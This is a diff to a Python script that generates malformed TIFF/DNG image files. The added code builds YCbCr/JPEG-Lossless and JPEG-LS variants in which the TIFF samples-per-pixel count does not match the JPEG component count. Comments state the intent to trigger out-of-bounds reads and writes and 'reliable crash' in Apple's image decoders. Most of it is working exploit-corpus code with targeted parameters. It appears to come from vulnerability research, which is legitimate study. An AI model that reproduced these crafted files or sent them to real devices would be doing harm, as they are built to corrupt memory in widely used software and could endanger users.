@@ -78,8 +78,13 @@ COMP_JPEG_LS       = 34892
 
 PHOTO_MINISBLACK = 1    # Grayscale (white = max value)
 PHOTO_RGB        = 2    # Standard RGB
+PHOTO_YCBCR      = 6    # YCbCr — routes to multi-component-aware JPEG decoder
 PHOTO_CFA        = 32803   # Camera Filter Array (Bayer raw) — SPP always=1
 PHOTO_LINEAR_RAW = 34892   # Linear demosaiced raw — SPP typically=3
+
+T_YCBCR_SUBSAMPLING = 530   # [HorizSub, VertSub] — e.g. [2,2] for 4:2:0
+T_YCBCR_POSITIONING = 531   # 1=centered, 2=cosited
+T_REF_BLACK_WHITE   = 532   # 6 rationals: [Yblack,Ywhite,Cbblack,Cbwhite,Crblack,Crwhite]
 
 # ========================== Two-pass TIFF builder ==========================
 
@@ -231,6 +236,47 @@ def build_plain_tiff(width=8, height=8, spp=1, bits=8,
     return b.build()
 
 
+# ========================== TIFF + YCbCr + JPEG-Lossless ==========================
+
+def build_tiff_ycbcr_jpegl(width=64, height=64, spp=3, inner_comps=3):
+    """
+    TIFF with PhotometricInterpretation=YCbCr (6) + JPEG-Lossless (compression=7).
+
+    YCbCr photometric routes to a multi-component-aware JPEG decoder path.
+    Unlike MinIsBlack/RGB which Apple decoded as single-component, the YCbCr
+    handler is expected to process Y, Cb, Cr as 3 separate components.
+
+    Mismatch targets:
+      spp=3 (TIFF outer — 3-channel YCbCr buffer), inner_comps=1 (SOF3 Nf=1)
+      → decoder allocates for 3 channels, iterates over inner_comps=1 → OOB READ
+      spp=1 (TIFF outer — 1-channel buffer), inner_comps=3 (SOF3 Nf=3)
+      → decoder writes 3 channels into 1-channel buffer → OOB WRITE
+    """
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH,  width)
+    b.add_long(T_IMAGE_LENGTH, height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
+    b.add_short(T_COMPRESSION, COMP_JPEG_LOSSLESS)
+    b.add_short(T_PHOTOMETRIC, PHOTO_YCBCR)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    # YCbCr required tags
+    b.add_short_array(T_YCBCR_SUBSAMPLING, [1, 1])   # 4:4:4 — no subsampling
+    b.add_short(T_YCBCR_POSITIONING, 1)               # centered
+    b.add_rational_array(T_REF_BLACK_WHITE, [          # standard JFIF/JPEG ranges
+        (0, 1), (255, 1),   # Y:  0..255
+        (128, 1), (255, 1), # Cb: 128±127
+        (128, 1), (255, 1), # Cr: 128±127
+    ])
+    payload = build_jpegl(width, height, nf=inner_comps, bits=8)
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
+    return b.build()
+
+
 # ========================== Old-style TIFF/JPEG-Lossless (JPEGTables split) ==========================
 
 def build_tiff_jpegl_split(width=64, height=64, spp=1, bits=8, inner_comps=None):
@@ -304,6 +350,35 @@ def build_tiff_jpegl_split(width=64, height=64, spp=1, bits=8, inner_comps=None)
     b.add_rational(T_Y_RESOLUTION, 72, 1)
     b.add_byte_array(T_JPEG_TABLES, bytes(tables))
     b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, bytes(strip))
+    return b.build()
+
+
+# ========================== Plain TIFF + JPEG-LS ==========================
+
+def build_tiff_jpegls(width=64, height=64, spp=3, inner_comps=None):
+    """
+    Plain TIFF with Compression=34892 (JPEG-LS) — not DNG, no Camera Raw routing.
+    JPEG-LS supports multi-component, so Apple's JPEG-LS decoder may iterate over
+    all Nf components (unlike the JPEGL decoder which is single-component).
+
+    inner_comps: Nf in SOF55 header (mismatch target when != spp)
+    """
+    if inner_comps is None:
+        inner_comps = spp
+    b = TiffBuilder()
+    b.add_long(T_IMAGE_WIDTH,  width)
+    b.add_long(T_IMAGE_LENGTH, height)
+    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
+    b.add_short(T_COMPRESSION, COMP_JPEG_LS)
+    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
+    b.add_short(T_SAMPLES_PER_PIXEL, spp)
+    b.add_long(T_ROWS_PER_STRIP, height)
+    b.add_short(T_PLANAR_CONFIG, 1)
+    b.add_short(T_RESOLUTION_UNIT, 2)
+    b.add_rational(T_X_RESOLUTION, 72, 1)
+    b.add_rational(T_Y_RESOLUTION, 72, 1)
+    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
+                build_jpegls(width, height, nf=inner_comps, bits=8))
     return b.build()
 
 
@@ -737,6 +812,68 @@ def generate_corpus(outdir='corpus'):
                       codec=codec, photometric=photometric, outfile=fname)
         except Exception as e:
             print(f'    [!] {name}: {e}')
+
+    # ---- NEW TARGET: TIFF + YCbCr + JPEG-Lossless ----
+    # YCbCr photometric routes to multi-component JPEG decoder path.
+    # If that decoder iterates over all 3 expected YCbCr components but SOF3 only
+    # declares Nf=1, we get an OOB read from the scan data stream.
+    ycbcr_jpegl_cases = [
+        # CTRL: SPP=3, Nf=3 (matching) — must decode cleanly to confirm YCbCr path is reached
+        ('CTRL_ycbcr_jpegl_3spp_3nf_8b',
+         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=3)),
+        # OOB READ: SPP=3 (YCbCr, 3-channel buffer), Nf=1 (stream has 1 component)
+        # Decoder loops over 3 channels, reads past end of single-component scan data
+        ('ycbcr_jpegl_3spp_1nf_8b',
+         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=1)),
+        ('ycbcr_jpegl_3spp_2nf_8b',
+         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=2)),
+        # OOB WRITE: SPP=1 (1-channel buffer), Nf=3 (decoder writes 3 channels)
+        ('ycbcr_jpegl_1spp_3nf_8b',
+         build_tiff_ycbcr_jpegl(64, 64, spp=1, inner_comps=3)),
+        # Large image variants — larger OOB for reliable crash
+        ('ycbcr_jpegl_3spp_1nf_8b_256',
+         build_tiff_ycbcr_jpegl(256, 256, spp=3, inner_comps=1)),
+        ('ycbcr_jpegl_3spp_1nf_8b_512',
+         build_tiff_ycbcr_jpegl(512, 512, spp=3, inner_comps=1)),
+    ]
+    print('\n[*] NEW TARGET: TIFF + YCbCr + JPEG-Lossless (multi-component decoder path):')
+    for name, data in ycbcr_jpegl_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
+
+    # ---- NEW TARGET: Plain TIFF + JPEG-LS ----
+    # JPEG-LS (compression=34892) in plain TIFF — distinct from DNG+JPEG-LS (Camera Raw).
+    # JPEG-LS supports multi-component; Apple's JPEG-LS decoder may iterate all Nf components.
+    tiff_jpegls_cases = [
+        # CTRL: SPP=3, Nf=3 — confirm JPEG-LS path is reachable in plain TIFF
+        ('CTRL_tiff_jpegls_3spp_3nf_8b',
+         build_tiff_jpegls(64, 64, spp=3, inner_comps=3)),
+        ('CTRL_tiff_jpegls_1spp_1nf_8b',
+         build_tiff_jpegls(64, 64, spp=1, inner_comps=1)),
+        # OOB READ: SPP=3, Nf=1
+        ('tiff_jpegls_3spp_1nf_8b',
+         build_tiff_jpegls(64, 64, spp=3, inner_comps=1)),
+        ('tiff_jpegls_3spp_2nf_8b',
+         build_tiff_jpegls(64, 64, spp=3, inner_comps=2)),
+        # OOB WRITE: SPP=1, Nf=3
+        ('tiff_jpegls_1spp_3nf_8b',
+         build_tiff_jpegls(64, 64, spp=1, inner_comps=3)),
+        ('tiff_jpegls_1spp_4nf_8b',
+         build_tiff_jpegls(64, 64, spp=1, inner_comps=4)),
+        # Large variants
+        ('tiff_jpegls_3spp_1nf_8b_256',
+         build_tiff_jpegls(256, 256, spp=3, inner_comps=1)),
+        ('tiff_jpegls_1spp_3nf_8b_256',
+         build_tiff_jpegls(256, 256, spp=1, inner_comps=3)),
+    ]
+    print('\n[*] NEW TARGET: Plain TIFF + JPEG-LS (multi-component capable codec):')
+    for name, data in tiff_jpegls_cases:
+        fname = os.path.join(outdir, f'{name}.dng')
+        with open(fname, 'wb') as f:
+            f.write(data)
+        print(f'    {fname}  ({len(data)} bytes)')
 
     # ---- Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format) ----
     # Alternative decoder path: SOF3 lives in tag 347, strip has only SOS+scan.
